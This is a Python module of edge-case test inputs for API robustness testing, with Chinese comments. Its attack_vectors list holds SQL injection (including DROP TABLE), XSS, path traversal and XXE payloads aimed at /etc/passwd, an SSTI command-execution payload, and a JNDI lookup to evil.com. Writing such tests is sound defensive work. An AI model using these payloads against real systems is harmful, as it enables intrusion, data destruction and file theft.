"""
边界用例生成器

生成各种边界条件和异常输入的测试用例，用于测试API的健壮性。

作者：TaKeKe团队
版本：1.0.0 - 边界测试用例生成器
"""

from typing import List, Dict, Any, Tuple
from dataclasses import dataclass
from uuid import uuid4, UUID


@dataclass
class TestCase:
    """测试用例"""
    value: Any
    description: str
    expected_result: str = "reject"  # accept/reject/warning
    category: str = ""


class EdgeCaseGenerator:
    """边界用例生成器"""

    @staticmethod
    def invalid_uuids() -> List[TestCase]:
        """无效UUID测试用例"""
        return [
            TestCase(
                value="not-a-uuid",
                description="非UUID格式的字符串",
                category="format_error"
            ),
            TestCase(
                value="12345",
                description="纯数字字符串",
                category="format_error"
            ),
            TestCase(
                value="00000000-0000-0000-0000-000000000000",
                description="Nil UUID",
                category="special_value"
            ),
            TestCase(
                value="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
                description="无效格式的UUID模板",
                category="format_error"
            ),
            TestCase(
                value="",
                description="空字符串",
                category="empty_value"
            ),
            TestCase(
                value="   ",
                description="纯空格字符串",
                category="whitespace"
            ),
            TestCase(
                value="550e8400-e29b-41d4-a716-446655440000",  # 有效的UUID格式，但可能不存在
                description="格式正确但可能不存在的UUID",
                category="valid_format_nonexistent"
            ),
            TestCase(
                value="550e8400-e29b-41d4-a716",  # 不完整的UUID
                description="不完整的UUID",
                category="format_error"
            ),
            TestCase(
                value="550e8400-e29b-41d4-a716-446655440000-12345",  # 过长的UUID
                description="过长的UUID格式",
                category="format_error"
            ),
            TestCase(
                value="550e8400_e29b_41d4_a716_446655440000",  # 错误的分隔符
                description="使用下划线分隔符的UUID",
                category="format_error"
            )
        ]

    @staticmethod
    def attack_vectors() -> List[TestCase]:
        """常见攻击向量"""
        return [
            TestCase(
                value="' OR '1'='1",
                description="SQL注入 - 经典",
                category="sql_injection"
            ),
            TestCase(
                value="'; DROP TABLE users; --",
                description="SQL注入 - 删除表",
                category="sql_injection"
            ),
            TestCase(
                value="' UNION SELECT * FROM users --",
                description="SQL注入 - UNION查询",
                category="sql_injection"
            ),
            TestCase(
                value="<script>alert('XSS')</script>",
                description="XSS攻击 - script标签",
                category="xss"
            ),
            TestCase(
                value="javascript:alert('XSS')",
                description="XSS攻击 - javascript协议",
                category="xss"
            ),
            TestCase(
                value="<img src='x' onerror='alert(\"XSS\")'>",
                description="XSS攻击 - 图片标签",
                category="xss"
            ),
            TestCase(
                value="../../../etc/passwd",
                description="路径遍历攻击",
                category="path_traversal"
            ),
            TestCase(
                value="..\\..\\..\\windows\\system32\\config\\sam",
                description="路径遍历攻击 - Windows",
                category="path_traversal"
            ),
            TestCase(
                value="{{7*7}}",
                description="模板注入 - 算术运算",
                category="template_injection"
            ),
            TestCase(
                value="${jndi:ldap://evil.com/a}",
                description="JNDI注入",
                category="jndi_injection"
            ),
            TestCase(
                value="<!DOCTYPE html [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><xxe>&xxe;</xxe>",
                description="XXE攻击",
                category="xxe"
            ),
            TestCase(
                value="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                description="模板注入 - SSTI",
                category="ssti"
            )
        ]

    @staticmethod
    def boundary_integers() -> List[TestCase]:
        """边界整数值"""
        return [
            TestCase(
                value=0,
                description="零值",
                category="boundary"
            ),
            TestCase(
                value=-1,
                description="负数-1",
                category="negative"
            ),
            TestCase(
                value=-999999,
                description="大负数",
                category="negative"
            ),
            TestCase(
                value=2147483647,  # 2^31 - 1
                description="32位有符号整数最大值",
                category="max_int"
            ),
            TestCase(
                value=2147483648,  # 2^31
                description="超过32位有符号整数最大值",
                category="overflow"
            ),
            TestCase(
                value=9223372036854775807,  # 2^63 - 1
                description="64位有符号整数最大值",
                category="max_long"
            ),
            TestCase(
                value=9223372036854775808,  # 2^63
                description="超过64位有符号整数最大值",
                category="overflow"
            ),
            TestCase(
                value=999999999999999999,
                description="极大数值",
                category="extreme"
            ),
            TestCase(
                value=-2147483648,  # -2^31
                description="32位有符号整数最小值",
                category="min_int"
            ),
            TestCase(
                value=-2147483649,  # -2^31 - 1
                description="低于32位有符号整数最小值",
                category="underflow"
            )
        ]

    @staticmethod
    def boundary_strings() -> List[TestCase]:
        """边界字符串"""
        return [
            TestCase(
                value="",
                description="空字符串",
                category="empty"
            ),
            TestCase(
                value=" ",
                description="单个空格",
                category="whitespace"
            ),
            TestCase(
                value="   ",
                description="多个空格",
                category="whitespace"
            ),
            TestCase(
                value="\t",
                description="制表符",
                category="special_chars"
            ),
            TestCase(
                value="\n",
                description="换行符",
                category="special_chars"
            ),
            TestCase(
                value="\r\n",
                description="Windows换行符",
                category="special_chars"
            ),
            TestCase(
                value="a" * 1000,
                description="1000字符长字符串",
                category="long_string"
            ),
            TestCase(
                value="a" * 10000,
                description="10000字符长字符串",
                category="very_long_string"
            ),
            TestCase(
                value="中文测试",
                description="中文字符串",
                category="unicode"
            ),
            TestCase(
                value="🚀 emoji test 🎉",
                description="Emoji字符串",
                category="emoji"
            ),
            TestCase(
                value="null",
                description="字符串'null'",
                category="null_string"
            ),
            TestCase(
                value="undefined",
                description="字符串'undefined'",
                category="undefined_string"
            ),
            TestCase(
                value="true",
                description="字符串'true'",
                category="boolean_string"
            ),
            TestCase(
                value="false",
                description="字符串'false'",
                category="boolean_string"
            ),
            TestCase(
                value="[]",
                description="字符串'[]'",
                category="array_string"
            ),
            TestCase(
                value="{}",
                description="字符串'{}'",
                category="object_string"
            )
        ]

    @staticmethod
    def boundary_dates() -> List[TestCase]:
        """边界日期"""
        return [
            TestCase(
                value="2025-10-25",
                description="正常日期 - 今天",
                category="normal"
            ),
            TestCase(
                value="1970-01-01",
                description="Unix纪元开始",
                category="boundary"
            ),
            TestCase(
                value="2099-12-31",
                description="未来日期 - 2099年底",
                category="future"
            ),
            TestCase(
                value="1900-01-01",
                description="过去日期 - 1900年初",
                category="past"
            ),
            TestCase(
                value="2025-02-30",
                description="不存在的日期 - 2月30日",
                category="invalid"
            ),
            TestCase(
                value="2025-13-01",
                description="不存在的月份 - 13月",
                category="invalid"
            ),
            TestCase(
                value="2025-00-01",
                description="不存在的月份 - 0月",
                category="invalid"
            ),
            TestCase(
                value="2025-10-32",
                description="不存在的日期 - 10月32日",
                category="invalid"
            ),
            TestCase(
                value="invalid-date",
                description="完全无效的日期格式",
                category="format_error"
            ),
            TestCase(
                value="2025/10/25",
                description="错误的日期分隔符",
                category="format_error"
            ),
            TestCase(
                value="25-10-2025",
                description="DD-MM-YYYY格式",
                category="format_error"
            ),
            TestCase(
                value="2025-10",
                description="不完整的日期",
                category="incomplete"
            )
        ]

    @staticmethod
    def boundary_floats() -> List[TestCase]:
        """边界浮点数"""
        return [
            TestCase(
                value=0.0,
                description="零浮点数",
                category="zero"
            ),
            TestCase(
                value=-0.0,
                description="负零",
                category="negative_zero"
            ),
            TestCase(
                value=3.14159265359,
                description="正常浮点数 - π",
                category="normal"
            ),
            TestCase(
                value=1.7976931348623157e+308,  # float最大值
                description="浮点数最大值",
                category="max_float"
            ),
            TestCase(
                value=2.2250738585072014e-308,  # float最小正值
                description="浮点数最小正值",
                category="min_positive_float"
            ),
            TestCase(
                value=float('inf'),
                description="正无穷大",
                category="infinity"
            ),
            TestCase(
                value=float('-inf'),
                description="负无穷大",
                category="negative_infinity"
            ),
            TestCase(
                value=float('nan'),
                description="NaN (Not a Number)",
                category="nan"
            ),
            TestCase(
                value=-999999.999,
                description="大负浮点数",
                category="large_negative"
            ),
            TestCase(
                value=999999.999,
                description="大正浮点数",
                category="large_positive"
            ),
            TestCase(
                value=1e-10,
                description="极小正数",
                category="very_small"
            )
        ]

    @staticmethod
    def boundary_booleans() -> List[TestCase]:
        """边界布尔值"""
        return [
            TestCase(
                value=True,
                description="布尔值 True",
                category="true"
            ),
            TestCase(
                value=False,
                description="布尔值 False",
                category="false"
            ),
            TestCase(
                value="true",
                description="字符串 'true'",
                category="string_true"
            ),
            TestCase(
                value="false",
                description="字符串 'false'",
                category="string_false"
            ),
            TestCase(
                value="TRUE",
                description="大写字符串 'TRUE'",
                category="string_true_upper"
            ),
            TestCase(
                value="FALSE",
                description="大写字符串 'FALSE'",
                category="string_false_upper"
            ),
            TestCase(
                value=1,
                description="整数 1 (可能被解释为True)",
                category="int_one"
            ),
            TestCase(
                value=0,
                description="整数 0 (可能被解释为False)",
                category="int_zero"
            ),
            TestCase(
                value="1",
                description="字符串 '1'",
                category="string_one"
            ),
            TestCase(
                value="0",
                description="字符串 '0'",
                category="string_zero"
            ),
            TestCase(
                value="yes",
                description="字符串 'yes'",
                category="string_yes"
            ),
            TestCase(
                value="no",
                description="字符串 'no'",
                category="string_no"
            ),
            TestCase(
                value="on",
                description="字符串 'on'",
                category="string_on"
            ),
            TestCase(
                value="off",
                description="字符串 'off'",
                category="string_off"
            )
        ]

    @staticmethod
    def boundary_arrays() -> List[TestCase]:
        """边界数组"""
        return [
            TestCase(
                value=[],
                description="空数组",
                category="empty"
            ),
            TestCase(
                value=[None],
                description="包含null的数组",
                category="contains_null"
            ),
            TestCase(
                value=[],
                description="空数组",
                category="empty"
            ),
            TestCase(
                value=[""],
                description="包含空字符串的数组",
                category="empty_string_element"
            ),
            TestCase(
                value=["   "],
                description="包含空格字符串的数组",
                category="whitespace_element"
            ),
            TestCase(
                value=[1, 2, 3, 4, 5],
                description="正常整数数组",
                category="normal"
            ),
            TestCase(
                value=["a", "b", "c"],
                description="正常字符串数组",
                category="normal"
            ),
            TestCase(
                value=[1, "a", 2.5, True],
                description="混合类型数组",
                category="mixed_types"
            ),
            TestCase(
                value=list(range(1000)),
                description="大数组 (1000个元素)",
                category="large"
            ),
            TestCase(
                value=[None] * 100,
                description="包含100个null的数组",
                category="many_nulls"
            ),
            TestCase(
                value=[["nested", "array"], ["another", "one"]],
                description="嵌套数组",
                category="nested"
            ),
            TestCase(
                value={"key": "value"},
                description="对象而非数组",
                category="wrong_type"
            )
        ]

    @staticmethod
    def get_all_edge_cases() -> Dict[str, List[TestCase]]:
        """获取所有边界测试用例"""
        return {
            "invalid_uuids": EdgeCaseGenerator.invalid_uuids(),
            "attack_vectors": EdgeCaseGenerator.attack_vectors(),
            "boundary_integers": EdgeCaseGenerator.boundary_integers(),
            "boundary_strings": EdgeCaseGenerator.boundary_strings(),
            "boundary_dates": EdgeCaseGenerator.boundary_dates(),
            "boundary_floats": EdgeCaseGenerator.boundary_floats(),
            "boundary_booleans": EdgeCaseGenerator.boundary_booleans(),
            "boundary_arrays": EdgeCaseGenerator.boundary_arrays()
        }

    @staticmethod
    def get_edge_cases_by_category(category: str) -> Dict[str, List[TestCase]]:
        """按类别获取边界测试用例"""
        all_cases = EdgeCaseGenerator.get_all_edge_cases()
        filtered = {}

        for case_type, cases in all_cases.items():
            filtered_cases = [
                case for case in cases
                if case.category == category
            ]
            if filtered_cases:
                filtered[case_type] = filtered_cases

        return filtered

    @staticmethod
    def get_security_test_cases() -> List[TestCase]:
        """获取安全相关的测试用例"""
        all_cases = EdgeCaseGenerator.get_all_edge_cases()
        security_cases = []

        security_categories = [
            "sql_injection", "xss", "path_traversal",
            "template_injection", "jndi_injection", "xxe", "ssti"
        ]

        for cases in all_cases.values():
            for case in cases:
                if case.category in security_categories:
                    security_cases.append(case)

        return security_cases


def main():
    """命令行测试入口"""
    generator = EdgeCaseGenerator()

    # 获取所有边界测试用例
    all_cases = generator.get_all_edge_cases()

    print("=== 边界测试用例生成器 ===")
    print(f"总计 {sum(len(cases) for cases in all_cases.values())} 个测试用例\n")

    for category, cases in all_cases.items():
        print(f"=== {category.upper()} ({len(cases)} 个用例) ===")
        for case in cases[:5]:  # 只显示前5个
            print(f"  - {case.description}")
        if len(cases) > 5:
            print(f"  ... 还有 {len(cases) - 5} 个用例")
        print()

    # 显示安全测试用例
    security_cases = generator.get_security_test_cases()
    print(f"=== 安全测试用例 ({len(security_cases)} 个) ===")
    for case in security_cases:
        print(f"  - {case.description} ({case.category})")

    print(f"\n总计生成 {sum(len(cases) for cases in all_cases.values())} 个边界测试用例")


if __name__ == "__main__":
    main()